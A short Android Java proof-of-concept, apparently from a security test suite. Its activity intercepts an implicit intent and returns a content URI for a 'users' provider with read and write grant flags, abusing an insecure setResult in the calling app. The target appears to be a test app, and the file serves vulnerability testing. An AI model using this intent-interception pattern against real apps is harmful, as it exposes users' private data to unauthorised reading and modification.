package sherlock.poc.insecure_set_result;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import androidx.appcompat.app.AppCompatActivity;

public class InterceptImplicitIntentActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intercept = new Intent();
        intercept.setData(Uri.parse("content://sherlock.test.users_provider/users"));
        intercept.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
        setResult(RESULT_OK, intercept);
        finish();
    }
}
